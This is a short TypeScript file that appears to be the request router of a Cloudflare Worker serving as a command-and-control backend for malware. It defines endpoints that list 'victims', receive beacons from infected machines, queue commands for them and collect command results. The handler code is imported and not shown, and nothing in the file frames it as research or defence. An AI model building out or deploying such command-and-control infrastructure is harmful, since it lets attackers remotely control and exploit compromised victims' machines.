import { getVictims } from "./routes/victims"
import { beacon } from "./routes/beacon"
import { issueCommand } from "./routes/command"
import { submitResult } from "./routes/result"
import { getResults } from "./routes/results"

export default {
  async fetch(request: Request, env: Env): Promise<Response> {
    const url = new URL(request.url)

    if (request.method === "GET" && url.pathname === "/api/victims") {
      return getVictims(request, env)
    }

    if (request.method === "POST" && url.pathname === "/beacon") {
      return beacon(request, env)
    }

    if (request.method === "POST" && url.pathname === "/api/command") {
      return issueCommand(request, env)
    }

    if (request.method === "POST" && url.pathname === "/api/result") {
      return submitResult(request, env)
    }

    if (request.method === "GET" && url.pathname === "/api/results") {
      return getResults(request, env)
    }

    return new Response("Not Found", { status: 404 })
  }
}
